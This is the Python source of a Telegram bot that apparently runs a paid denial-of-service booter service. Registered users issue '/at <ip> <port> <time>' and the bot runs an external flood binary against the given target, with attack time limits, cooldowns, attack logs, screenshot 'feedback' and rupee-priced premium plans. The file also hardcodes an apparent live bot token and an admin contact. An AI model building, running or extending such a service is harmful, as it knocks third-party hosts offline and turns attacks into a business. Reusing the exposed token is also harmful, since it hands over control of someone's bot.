
import os
import json
import time
import random
import signal
import telebot
import threading
from telebot import types
from datetime import datetime, timedelta

# Initialize bot with token (replace with your token)
TOKEN = '7585657026:AAEMT-G1MDQnsLBLoWP-79QNRo1bIOQReYs'  # Replace with your actual bot token
bot = telebot.TeleBot(TOKEN)

# Admin ID - replace with your actual admin ID
ADMIN_ID = 6696347739  # Replace with your actual admin ID

# Set bot commands
bot.set_my_commands([
    telebot.types.BotCommand("start", "Initialize the attack system"),
    telebot.types.BotCommand("help", "View available commands"),
    telebot.types.BotCommand("at", "Launch an attack"),
    telebot.types.BotCommand("report", "Report an error to admin"),
    telebot.types.BotCommand("buy", "View premium plans")
])

# Initialize data files
if not os.path.exists('users.json'):
    with open('users.json', 'w') as f:
        json.dump({}, f)

if not os.path.exists('attack_logs.json'):
    with open('attack_logs.json', 'w') as f:
        json.dump({}, f)

# User state tracking
user_state = {}
user_captcha = {}
user_attacks = {}
cooldown_timers = {}
feedback_pending = {}

# Data handling functions
def load_users():
    try:
        with open('users.json', 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(users, f, indent=4)

def load_attack_logs():
    try:
        with open('attack_logs.json', 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_attack_logs(logs):
    with open('attack_logs.json', 'w') as f:
        json.dump(logs, f, indent=4)

# Function to generate a simple math CAPTCHA
def generate_captcha():
    num1 = random.randint(1, 10)
    num2 = random.randint(1, 10)
    operation = random.choice(['+', '-', '*'])
    
    if operation == '+':
        result = num1 + num2
    elif operation == '-':
        result = num1 - num2
    else:
        result = num1 * num2
        
    question = f"{num1} {operation} {num2} = ?"
    return question, str(result)

# Function to check if user is approved
def is_user_approved(user_id):
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id in users:
        # If paid user
        if users[str_user_id].get("paid", False):
            expiry_time = users[str_user_id].get("expiry_time", 0)
            if expiry_time > time.time():
                return True, "paid"
            else:
                # Subscription expired
                users[str_user_id]["paid"] = False
                save_users(users)
                return False, "expired"
        
        # If free user
        if users[str_user_id].get("approved", False):
            # Check for feedback pending
            if feedback_pending.get(user_id, 0) >= 2:
                return False, "feedback_required"
            return True, "free"
    
    return False, "not_registered"

# Function to check for attack cooldown
def check_cooldown(user_id, ip):
    if user_id in cooldown_timers and ip not in cooldown_timers[user_id].get("allowed_ips", []):
        # Check if cooldown period is still active
        cooldown_end = cooldown_timers[user_id].get("cooldown_until", 0)
        if cooldown_end > time.time():
            remaining = int(cooldown_end - time.time())
            return False, remaining
    
    return True, 0

# Function to add IP to cooldown
def add_ip_to_cooldown(user_id, ip):
    if user_id not in cooldown_timers:
        cooldown_timers[user_id] = {"allowed_ips": [ip], "cooldown_until": time.time() + 300}
    else:
        cooldown_timers[user_id]["allowed_ips"].append(ip)
        cooldown_timers[user_id]["cooldown_until"] = time.time() + 300

# Function to check for existing attacks
def has_active_attack(user_id):
    return user_id in user_attacks and user_attacks[user_id]["active"]

# Function to record attack
def record_attack(user_id, ip, port, duration):
    logs = load_attack_logs()
    str_user_id = str(user_id)
    
    if str_user_id not in logs:
        logs[str_user_id] = []
    
    logs[str_user_id].append({
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": ip,
        "port": port,
        "duration": duration
    })
    
    save_attack_logs(logs)

# Function to check if IP+port combination was used before
def check_ip_port_history(user_id, ip, port):
    logs = load_attack_logs()
    str_user_id = str(user_id)
    
    if str_user_id in logs:
        for entry in logs[str_user_id]:
            if entry["ip"] == ip and entry["port"] == port:
                return True
    
    return False

# Start Command
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Animation message
    animation = "Initializing System...\n"
    animation += "█████████ 100% [LOADED] ✅\n"
    animation += "🔓 Unlocking Secure Gateway...\n"
    
    # Send initial message
    msg = bot.send_message(chat_id, animation)
    
    # Simulate loading animation
    animations = [
        "🔓 Unlocking Secure Gateway...\n█▒▒▒▒▒▒▒▒▒▒▒▒ 10%",
        "🔓 Unlocking Secure Gateway...\n███▒▒▒▒▒▒▒▒▒▒ 30%",
        "🔓 Unlocking Secure Gateway...\n█████▒▒▒▒▒▒▒▒ 50%",
        "🔓 Unlocking Secure Gateway...\n███████▒▒▒▒▒▒ 70%",
        "🔓 Unlocking Secure Gateway...\n█████████▒▒▒▒ 90%",
        "🔓 Unlocking Secure Gateway...\n███████████ 100% ✅\nACCESS GRANTED 🟢"
    ]
    
    for anim in animations:
        time.sleep(0.5)  # Adjust delay as needed
        try:
            bot.edit_message_text(
                "Initializing System...\n█████████ 100% [LOADED] ✅\n" + anim,
                chat_id,
                msg.message_id
            )
        except:
            pass  # Ignore edit errors
    
    # Final welcome message
    welcome_text = (
        "Initializing System...\n"
        "█████████ 100% [LOADED] ✅\n"
        "🔓 Unlocking Secure Gateway...\n"
        "███████████ 100% ✅\n"
        "ACCESS GRANTED 🟢\n\n"
        "🦾 Welcome, Cyber Warrior! Ready to Dominate the Dos service?\n"
        "🔰 But First, Verify Yourself…"
    )
    
    bot.edit_message_text(welcome_text, chat_id, msg.message_id)
    
    # Check if user already verified
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id in users and users[str_user_id].get("captcha_verified", False):
        # User has already completed verification, go to main menu
        if users[str_user_id].get("agreed_terms", False):
            # User has agreed to terms, show help
            help_command(message)
        else:
            # User hasn't agreed to terms, ask for agreement
            ask_for_terms_agreement(chat_id)
    else:
        # Start verification process
        captcha_question, captcha_answer = generate_captcha()
        user_captcha[user_id] = captcha_answer
        user_state[user_id] = "verify_captcha"
        
        bot.send_message(
            chat_id,
            f"🔐 *SECURITY VERIFICATION*\n\nSolve this CAPTCHA to proceed:\n\n{captcha_question}",
            parse_mode="Markdown"
        )

# Handle CAPTCHA verification
@bot.message_handler(func=lambda message: user_state.get(message.from_user.id) == "verify_captcha")
def verify_captcha(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    answer = message.text.strip()
    
    if answer == user_captcha.get(user_id):
        # CAPTCHA verified, save verification status
        users = load_users()
        str_user_id = str(user_id)
        
        if str_user_id not in users:
            users[str_user_id] = {}
        
        users[str_user_id]["captcha_verified"] = True
        users[str_user_id]["username"] = message.from_user.username or "None"
        users[str_user_id]["join_date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_users(users)
        
        # Ask for name
        user_state[user_id] = "input_name"
        bot.send_message(chat_id, "🔐 *VERIFICATION SUCCESSFUL*\n\nPlease enter your name to continue:", parse_mode="Markdown")
    else:
        bot.send_message(chat_id, "❌ *INCORRECT ANSWER*\n\nPlease try again:", parse_mode="Markdown")

# Handle user name input
@bot.message_handler(func=lambda message: user_state.get(message.from_user.id) == "input_name")
def process_name(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    name = message.text.strip()
    
    if len(name) < 2:
        bot.send_message(chat_id, "⚠️ *INVALID INPUT*\n\nName must be at least 2 characters long. Try again:", parse_mode="Markdown")
        return
    
    # Store user name in database
    users = load_users()
    str_user_id = str(user_id)
    
    if str_user_id not in users:
        users[str_user_id] = {}
    
    users[str_user_id]["name"] = name
    users[str_user_id]["username"] = message.from_user.username or "None"
    save_users(users)
    
    # Notify admin about new user
    admin_message = (
        f"🔔 *NEW USER REGISTRATION*\n\n"
        f"👤 Name: {name}\n"
        f"🆔 User ID: `{user_id}`\n"
        f"👤 Username: @{message.from_user.username or 'None'}\n"
        f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    bot.send_message(ADMIN_ID, admin_message, parse_mode="Markdown")
    
    # Ask for terms agreement
    ask_for_terms_agreement(chat_id)

# Function to ask for terms agreement
def ask_for_terms_agreement(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ YES", callback_data="agree_terms"),
        types.InlineKeyboardButton("❌ NO", callback_data="decline_terms")
    )
    
    terms_text = (
        "📜 *TERMS & CONDITIONS*\n\n"
        "To use this system, you must agree to send feedback (photo) after every attack.\n\n"
        "Will you send feedback after every attack?"
    )
    
    bot.send_message(chat_id, terms_text, parse_mode="Markdown", reply_markup=markup)

# Handle terms agreement
@bot.callback_query_handler(func=lambda call: call.data in ["agree_terms", "decline_terms"])
def handle_terms_agreement(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    # Acknowledge the callback query
    bot.answer_callback_query(call.id)
    
    if call.data == "agree_terms":
        # User agreed to terms
        users = load_users()
        str_user_id = str(user_id)
        
        if str_user_id in users:
            users[str_user_id]["agreed_terms"] = True
            users[str_user_id]["approved"] = True
            save_users(users)
        
        confirmation = (
            "✅ *TERMS ACCEPTED*\n\n"
            "You have agreed to send feedback after each attack.\n"
            "System access granted. Initializing help menu..."
        )
        
        bot.edit_message_text(
            confirmation,
            chat_id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=None
        )
        
        # Automatically show help
        time.sleep(1)  # Slight delay
        help_command_for_chat_id(chat_id)
    else:
        # User declined terms
        decline_message = (
            "⚠️ *ACCESS DENIED: Get Lost!*\n\n"
            "You must agree to the terms to use this system.\n"
            "Restart with /start if you change your mind."
        )
        
        bot.edit_message_text(
            decline_message,
            chat_id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=None
        )

# Help Command
@bot.message_handler(commands=['help'])
def help_command(message):
    chat_id = message.chat.id
    help_command_for_chat_id(chat_id)

def help_command_for_chat_id(chat_id):
    help_text = (
        "📜 *AVAILABLE COMMANDS*\n\n"
        "1️⃣ `/at <ip> <port> <time>` → Launch attack\n"
        "   Example: `/at 192.168.1.1 8080 60`\n\n"
        "2️⃣ `/report` → Send error reports to admin\n\n"
        "3️⃣ `/buy` → View paid plans & contact admin\n\n"
        "⚠️ *ATTACK RULES*:\n"
        "• Max time for new IP+Port: 230 sec\n"
        "• Same IP+Port: 60 sec max\n"
        "• New IP after attack: 5-minute cooldown\n"
        "• Only one attack at a time per user\n"
        "• Attack won't work if feedback is pending"
    )
    
    bot.send_message(chat_id, help_text, parse_mode="Markdown")

# Attack Command
@bot.message_handler(commands=['at'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if user is approved
    approved, status = is_user_approved(user_id)
    
    if not approved:
        if status == "not_registered":
            bot.send_message(chat_id, "❌ *ACCESS DENIED*\n\nYou must register first. Use /start", parse_mode="Markdown")
        elif status == "expired":
            bot.send_message(chat_id, "❌ *SUBSCRIPTION EXPIRED*\n\nYour paid subscription has expired. Use /buy to renew.", parse_mode="Markdown")
        elif status == "feedback_required":
            bot.send_message(
                chat_id,
                "🚨 *SYSTEM ALERT* 🚨\n\n❌ ACTION BLOCKED!\n⚠️ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.",
                parse_mode="Markdown"
            )
        return
    
    # Check for feedback pending (for free users)
    if status == "free" and user_id in feedback_pending and feedback_pending[user_id] > 0:
        bot.send_message(
            chat_id,
            "🚨 *SYSTEM ALERT* 🚨\n\n❌ ATTACK DENIED!\n⚠️ Previous attack feedback is pending.\nPlease send a screenshot of your last attack result.",
            parse_mode="Markdown"
        )
        return
    
    # Parse command parameters
    parts = message.text.split()
    
    if len(parts) != 4:
        bot.send_message(
            chat_id,
            "❌ *INVALID COMMAND FORMAT*\n\nCorrect usage: `/at <ip> <port> <time>`\nExample: `/at 192.168.1.1 8080 60`",
            parse_mode="Markdown"
        )
        return
    
    ip = parts[1]
    
    # Validate IP
    if not all(part.isdigit() and 0 <= int(part) <= 255 for part in ip.split('.')):
        bot.send_message(chat_id, "❌ *INVALID IP ADDRESS*\n\nPlease enter a valid IP address.", parse_mode="Markdown")
        return
    
    # Validate port
    try:
        port = int(parts[2])
        if not (0 < port < 65536):
            raise ValueError
    except ValueError:
        bot.send_message(chat_id, "❌ *INVALID PORT*\n\nPort must be a number between 1-65535.", parse_mode="Markdown")
        return
    
    # Validate and limit time
    try:
        requested_time = int(parts[3])
        
        # Check if IP+port combination was used before
        if check_ip_port_history(user_id, ip, port):
            max_time = 60  # 60 seconds for repeat IP+port
        else:
            max_time = 230  # 230 seconds for new IP+port
        
        if requested_time <= 0 or requested_time > max_time:
            bot.send_message(
                chat_id, 
                f"❌ *INVALID TIME*\n\nTime must be between 1-{max_time} seconds for this target.",
                parse_mode="Markdown"
            )
            return
        
        # Use the requested time
        time_seconds = requested_time
        
    except ValueError:
        bot.send_message(chat_id, "❌ *INVALID TIME*\n\nTime must be a valid number in seconds.", parse_mode="Markdown")
        return
    
    # Check for active attack
    if has_active_attack(user_id):
        timeleft = max(0, int(user_attacks[user_id]["end_time"] - time.time()))
        
        bot.send_message(
            chat_id,
            f"🚨 *SYSTEM ALERT* 🚨\n\n❌ ATTACK DENIED!\n⚠️ You already have an attack running.\n⏳ Please wait {timeleft} seconds for completion...",
            parse_mode="Markdown"
        )
        return
    
    # Check cooldown for new IP
    if ip not in cooldown_timers.get(user_id, {}).get("allowed_ips", [ip]):
        can_attack, remaining = check_cooldown(user_id, ip)
        
        if not can_attack:
            minutes = remaining // 60
            seconds = remaining % 60
            
            bot.send_message(
                chat_id,
                f"🚨 *SYSTEM ALERT* 🚨\n\n❌ ATTACK DENIED!\n⚠️ You must wait *5 minutes* before using a new IP!\n⏳ Time Left: {minutes}:{seconds:02d}",
                parse_mode="Markdown"
            )
            return
    
    # Start the attack
    # Send initial message
    attack_msg = bot.send_message(
        chat_id,
        f"🚀 *ATTACK LAUNCHED!* 🚀\n\n🎯 **Target:** {ip}:{port}\n⏳ **Time Left:** {time_seconds} sec\n⚠ **Do NOT close the bot, attack in progress...**",
        parse_mode="Markdown"
    )
    
    # Record the attack
    user_attacks[user_id] = {
        "active": True,
        "ip": ip,
        "port": port,
        "duration": time_seconds,
        "start_time": time.time(),
        "end_time": time.time() + time_seconds,
        "message_id": attack_msg.message_id
    }
    
    # Add IP to allowed IPs to avoid cooldown for this IP
    if user_id not in cooldown_timers:
        cooldown_timers[user_id] = {"allowed_ips": [ip], "cooldown_until": 0}
    elif ip not in cooldown_timers[user_id].get("allowed_ips", []):
        cooldown_timers[user_id]["allowed_ips"].append(ip)
    
    # Start thread for countdown and attack
    thread = threading.Thread(target=run_attack, args=(user_id, ip, port, time_seconds, chat_id, attack_msg.message_id))
    thread.daemon = True
    thread.start()
    
    # Log the attack
    record_attack(user_id, ip, port, time_seconds)

def run_attack(user_id, ip, port, duration, chat_id, message_id):
    # Execute the actual attack command
    cmd = f"./moul {ip} {port} {duration} 70"
    
    try:
        # Start the attack process
        attack_process = threading.Thread(target=os.system, args=(cmd,))
        attack_process.daemon = True
        attack_process.start()
        
        # Update countdown every second
        end_time = time.time() + duration
        
        for remaining in range(duration, 0, -1):
            if time.time() >= end_time:
                break
                
            try:
                # Update message with countdown
                bot.edit_message_text(
                    f"🔥 *ATTACK IN PROGRESS* 🔥\n\n⏳ Time Left: {remaining} sec",
                    chat_id,
                    message_id,
                    parse_mode="Markdown"
                )
                time.sleep(1)
            except Exception as e:
                print(f"Error updating countdown: {e}")
        
        # Mark attack as completed
        if user_id in user_attacks:
            user_attacks[user_id]["active"] = False
        
        # Final message
        try:
            bot.edit_message_text(
                f"✅ *ATTACK COMPLETED* ✅\n\n🎯 Target: {ip}:{port}\n⏱ Duration: {duration} seconds\n\n📸 Please send a screenshot of the results (if required)",
                chat_id,
                message_id,
                parse_mode="Markdown"
            )
            
            # For free users, mark feedback as pending
            users = load_users()
            str_user_id = str(user_id)
            
            if str_user_id in users and not users[str_user_id].get("paid", False):
                feedback_pending[user_id] = feedback_pending.get(user_id, 0) + 1
        
        except Exception as e:
            print(f"Error sending completion message: {e}")
        
        # After attack finishes, start cooldown for new IPs
        add_ip_to_cooldown(user_id, ip)
        
    except Exception as e:
        print(f"Error in attack execution: {e}")
        try:
            bot.send_message(
                chat_id,
                f"⚠️ *ATTACK ERROR* ⚠️\n\nAn error occurred while running the attack:\n`{str(e)}`",
                parse_mode="Markdown"
            )
        except:
            pass

# Handle photo uploads (for feedback)
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Check if user has pending feedback
    if user_id in feedback_pending and feedback_pending[user_id] > 0:
        # Reduce pending feedback count
        feedback_pending[user_id] -= 1
        
        # Thank the user
        bot.send_message(
            chat_id,
            "✅ *FEEDBACK RECEIVED* ✅\n\nThank you for your feedback!\nYou can now start a new attack.",
            parse_mode="Markdown"
        )
        
        # Forward the feedback to admin
        users = load_users()
        str_user_id = str(user_id)
        name = "Unknown"
        
        if str_user_id in users:
            name = users[str_user_id].get("name", "Unknown")
        
        # Add caption with user info
        bot.send_photo(
            ADMIN_ID,
            message.photo[-1].file_id,
            caption=f"📸 *ATTACK FEEDBACK*\n\n👤 From: {name}\n🆔 User ID: `{user_id}`\n👤 Username: @{message.from_user.username or 'None'}\n📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown"
        )

# Report Command
@bot.message_handler(commands=['report'])
def report_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Check if user is approved
    approved, status = is_user_approved(user_id)
    
    if not approved:
        if status == "feedback_required":
            bot.send_message(
                chat_id,
                "🚨 *SYSTEM ALERT* 🚨\n\n❌ ACTION BLOCKED!\n⚠️ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.",
                parse_mode="Markdown"
            )
        else:
            bot.send_message(chat_id, "❌ *ACCESS DENIED*\n\nYou are not authorized to use this command.", parse_mode="Markdown")
        return
    
    # Ask user to describe the issue
    user_state[user_id] = "awaiting_report"
    
    bot.send_message(
        chat_id,
        "🔍 *ERROR REPORT*\n\nPlease describe the issue you're experiencing:\n(Type your message below)",
        parse_mode="Markdown"
    )

# Handle report submission
@bot.message_handler(func=lambda message: user_state.get(message.from_user.id) == "awaiting_report")
def process_report(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    report_text = message.text.strip()
    
    # Clear user state
    if user_id in user_state:
        del user_state[user_id]
    
    # Forward report to admin
    users = load_users()
    str_user_id = str(user_id)
    name = "Unknown"
    
    if str_user_id in users:
        name = users[str_user_id].get("name", "Unknown")
    
    admin_message = (
        f"⚠️ *ERROR REPORT RECEIVED*\n\n"
        f"👤 From: {name}\n"
        f"🆔 User ID: `{user_id}`\n"
        f"👤 Username: @{message.from_user.username or 'None'}\n"
        f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"📝 *Report*:\n{report_text}"
    )
    
    bot.send_message(ADMIN_ID, admin_message, parse_mode="Markdown")
    
    # Confirm to user
    bot.send_message(
        chat_id,
        "✅ *REPORT SUBMITTED*\n\nThank you for your report. The admin will review it shortly.",
        parse_mode="Markdown"
    )

# Buy Command
@bot.message_handler(commands=['buy'])
def buy_command(message):
    chat_id = message.chat.id
    
    buy_text = (
        "💰 *PREMIUM PLANS*\n\n"
        "✅ Benefits:\n"
        "• No feedback required\n"
        "• Priority attack processing\n"
        "• Premium support\n\n"
        "📱 *Pricing*:\n"
        "• 1 Day = ₹10\n"
        "• 7 Days = ₹50\n\n"
        "📞 Contact Admin: @Mukeshchh999\n\n"
        "💡 To purchase, contact the admin with your user ID: `{}`"
    ).format(message.from_user.id)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📞 Contact Admin", url="https://t.me/Mukeshchh999"))
    
    bot.send_message(chat_id, buy_text, parse_mode="Markdown", reply_markup=markup)

# Admin Commands
# Approve user
@bot.message_handler(commands=['approve'], func=lambda message: message.from_user.id == ADMIN_ID)
def approve_user(message):
    chat_id = message.chat.id
    
    try:
        # Extract user_id and days from command
        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(chat_id, "❌ *INCORRECT FORMAT*\n\nUsage: `/approve <user_id> <days>`", parse_mode="Markdown")
            return
        
        user_id = parts[1]
        days = int(parts[2])
        
        if days <= 0:
            bot.send_message(chat_id, "❌ *INVALID DAYS*\n\nDays must be a positive number.", parse_mode="Markdown")
            return
        
        users = load_users()
        
        if user_id in users:
            # Calculate expiry time
            expiry_time = time.time() + (days * 86400)  # Convert days to seconds
            
            # Update user information
            users[user_id]["paid"] = True
            users[user_id]["approved"] = True
            users[user_id]["subscription"] = f"{days} Day(s) Premium"
            users[user_id]["payment_date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            users[user_id]["expiry_time"] = expiry_time
            save_users(users)
            
            # Clear any pending feedback
            if int(user_id) in feedback_pending:
                feedback_pending[int(user_id)] = 0
            
            bot.send_message(chat_id, f"✅ *USER APPROVED*\n\nUser {user_id} has been approved for {days} day(s).", parse_mode="Markdown")
            
            # Notify user
            try:
                bot.send_message(
                    int(user_id),
                    f"✅ *PREMIUM ACTIVATED*\n\nYour premium subscription has been activated for {days} day(s)!\n\nEnjoy the premium benefits!",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Error notifying user: {e}")
        else:
            bot.send_message(chat_id, "❌ *USER NOT FOUND*\n\nUser does not exist in the database.", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"❌ *ERROR*\n\n`{str(e)}`", parse_mode="Markdown")

# Disapprove user
@bot.message_handler(commands=['disapprove'], func=lambda message: message.from_user.id == ADMIN_ID)
def disapprove_user(message):
    chat_id = message.chat.id
    
    try:
        # Extract user_id from command
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(chat_id, "❌ *INCORRECT FORMAT*\n\nUsage: `/disapprove <user_id>`", parse_mode="Markdown")
            return
        
        user_id = parts[1]
        users = load_users()
        
        if user_id in users:
            # Disapprove user
            users[user_id]["approved"] = False
            users[user_id]["paid"] = False
            save_users(users)
            
            # Terminate any active attacks
            if int(user_id) in user_attacks and user_attacks[int(user_id)]["active"]:
                user_attacks[int(user_id)]["active"] = False
            
            bot.send_message(chat_id, f"✅ *USER BLOCKED*\n\nUser {user_id} has been blocked from using the bot.", parse_mode="Markdown")
            
            # Notify user
            try:
                bot.send_message(
                    int(user_id),
                    "⚠️ *ACCESS REVOKED*\n\nYour access has been revoked by the admin. Please contact support for more information.",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Error notifying user: {e}")
        else:
            bot.send_message(chat_id, "❌ *USER NOT FOUND*\n\nUser does not exist in the database.", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"❌ *ERROR*\n\n`{str(e)}`", parse_mode="Markdown")

# VIP access for free users
@bot.message_handler(commands=['vip'], func=lambda message: message.from_user.id == ADMIN_ID)
def vip_access(message):
    chat_id = message.chat.id
    
    try:
        # Extract user_id from command
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(chat_id, "❌ *INCORRECT FORMAT*\n\nUsage: `/vip <user_id>`", parse_mode="Markdown")
            return
        
        user_id = parts[1]
        int_user_id = int(user_id)
        users = load_users()
        
        if user_id in users:
            # Grant VIP access (approved but not paid)
            users[user_id]["approved"] = True
            save_users(users)
            
            # Clear pending feedback
            if int_user_id in feedback_pending:
                feedback_pending[int_user_id] = 0
            
            bot.send_message(chat_id, f"✅ *VIP ACCESS GRANTED*\n\nUser {user_id} has been granted VIP access.", parse_mode="Markdown")
            
            # Notify user
            try:
                bot.send_message(
                    int_user_id,
                    "✅ *VIP ACCESS GRANTED*\n\nYou have been granted special access by the admin!",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"Error notifying user: {e}")
        else:
            bot.send_message(chat_id, "❌ *USER NOT FOUND*\n\nUser does not exist in the database.", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"❌ *ERROR*\n\n`{str(e)}`", parse_mode="Markdown")

# View logs
@bot.message_handler(commands=['logs'], func=lambda message: message.from_user.id == ADMIN_ID)
def view_logs(message):
    chat_id = message.chat.id
    
    try:
        # Extract user_id from command
        parts = message.text.split()
        if len(parts) != 2:
            bot.send_message(chat_id, "❌ *INCORRECT FORMAT*\n\nUsage: `/logs <user_id>`", parse_mode="Markdown")
            return
        
        user_id = parts[1]
        users = load_users()
        logs = load_attack_logs()
        
        if user_id in users:
            user_data = users[user_id]
            name = user_data.get("name", "Not available")
            
            # Format user logs
            log_text = (
                f"📋 *USER LOGS*\n\n"
                f"👤 User ID: `{user_id}`\n"
                f"👤 Name: {name}\n"
                f"👤 Username: @{user_data.get('username','None')}\n"
                f"📅 Join Date: {user_data.get('join_date', 'Not available')}\n"
                f"🔑 Approved: {'Yes' if user_data.get('approved', False) else 'No'}\n"
                f"💰 Premium: {'Yes' if user_data.get('paid', False) else 'No'}\n"
            )
            
            # Add subscription info if available
            if "subscription" in user_data:
                log_text += f"📅 Subscription: {user_data['subscription']}\n"
            
            # Add expiry time if available
            if "expiry_time" in user_data:
                expiry_date = datetime.fromtimestamp(user_data["expiry_time"]).strftime("%Y-%m-%d %H:%M:%S")
                log_text += f"⏱ Expiry Date: {expiry_date}\n\n"
            
            # Add attack history if available
            if user_id in logs and logs[user_id]:
                log_text += "\n📜 *ATTACK HISTORY*:\n\n"
                
                # Calculate total attack time
                total_attack_time = sum(entry["duration"] for entry in logs[user_id])
                log_text += f"⏱ Total Attack Time: {total_attack_time} seconds\n\n"
                
                # Show last 10 attacks
                for i, attack in enumerate(logs[user_id][-10:], 1):
                    log_text += (
                        f"{i}. Date: {attack['timestamp']}\n"
                        f"   Target: {attack['ip']}:{attack['port']}\n"
                        f"   Duration: {attack['duration']} seconds\n\n"
                    )
            else:
                log_text += "\n📜 *ATTACK HISTORY*: None\n\n"
            
            # Save logs to a file
            log_file = f"logs_{user_id}.txt"
            with open(log_file, "w") as f:
                f.write(log_text.replace("*", "").replace("`", ""))
            
            # Send file and message
            with open(log_file, "rb") as f:
                bot.send_document(chat_id, f, caption=f"📋 Full logs for user {name} ({user_id})")
            
            # Clean up
            os.remove(log_file)
            
            # Send summary
            bot.send_message(chat_id, log_text, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "❌ *USER NOT FOUND*\n\nUser does not exist in the database.", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(chat_id, f"❌ *ERROR*\n\n`{str(e)}`", parse_mode="Markdown")

# View all users
@bot.message_handler(commands=['view'], func=lambda message: message.from_user.id == ADMIN_ID)
def view_users(message):
    chat_id = message.chat.id
    
    users = load_users()
    
    approved_users = []
    paid_users = []
    free_users = []
    
    for user_id, user_data in users.items():
        username = user_data.get("username", "None")
        name = user_data.get("name", "Unknown")
        
        if user_data.get("paid", False):
            expiry_time = user_data.get("expiry_time", 0)
            expiry_date = datetime.fromtimestamp(expiry_time).strftime("%Y-%m-%d") if expiry_time > 0 else "N/A"
            paid_users.append(f"👤 ID: `{user_id}`\n   Name: {name}\n   Username: @{username}\n   Expiry: {expiry_date}\n")
        elif user_data.get("approved", False):
            approved_users.append(f"👤 ID: `{user_id}`\n   Name: {name}\n   Username: @{username}\n")
        else:
            free_users.append(f"👤 ID: `{user_id}`\n   Name: {name}\n   Username: @{username}\n")
    
    # Send paid users
    if paid_users:
        text = f"💰 *PAID USERS ({len(paid_users)})*\n\n" + "\n".join(paid_users)
        bot.send_message(chat_id, text, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, "💰 *PAID USERS (0)*\n\nNo paid users found.", parse_mode="Markdown")
    
    # Send approved (VIP) users
    if approved_users:
        text = f"✅ *APPROVED USERS ({len(approved_users)})*\n\n" + "\n".join(approved_users)
        bot.send_message(chat_id, text, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, "✅ *APPROVED USERS (0)*\n\nNo approved users found.", parse_mode="Markdown")
    
    # Send free users
    if free_users:
        text = f"👥 *FREE USERS ({len(free_users)})*\n\n" + "\n".join(free_users)
        bot.send_message(chat_id, text, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, "👥 *FREE USERS (0)*\n\nNo free users found.", parse_mode="Markdown")

# Broadcast message
@bot.message_handler(commands=['broadcast'], func=lambda message: message.from_user.id == ADMIN_ID)
def broadcast_message(message):
    chat_id = message.chat.id
    
    try:
        # Extract broadcast message
        broadcast_text = message.text.replace("/broadcast", "", 1).strip()
        
        if not broadcast_text:
            bot.send_message(chat_id, "❌ *INCORRECT FORMAT*\n\nUsage: `/broadcast <message>`", parse_mode="Markdown")
            return
        
        # Get all users
        users = load_users()
        success_count = 0
        failed_count = 0
        
        # Send confirmation
        confirm_msg = bot.send_message(chat_id, f"📣 Broadcasting message to {len(users)} users...")
        
        # Send broadcast
        for user_id in users:
            try:
                bot.send_message(
                    int(user_id),
                    f"📢 *ADMIN ANNOUNCEMENT*\n\n{broadcast_text}",
                    parse_mode="Markdown"
                )
                success_count += 1
            except Exception as e:
                print(f"Error sending to user {user_id}: {e}")
                failed_count += 1
        
        # Update confirmation message
        bot.edit_message_text(
            f"✅ *BROADCAST COMPLETED*\n\n• Sent to {success_count} users\n• Failed: {failed_count} users",
            chat_id,
            confirm_msg.message_id,
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.send_message(chat_id, f"❌ *ERROR*\n\n`{str(e)}`", parse_mode="Markdown")

# Start the bot
if __name__ == "__main__":
    print("Starting Attack System Bot...")
    try:
        # Make sure all required files exist
        if not os.path.exists('users.json'):
            with open('users.json', 'w') as f:
                json.dump({}, f)
            print("Created users.json file")
        
        if not os.path.exists('attack_logs.json'):
            with open('attack_logs.json', 'w') as f:
                json.dump({}, f)
            print("Created attack_logs.json file")
        
        print("Bot is running...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Error starting bot: {e}")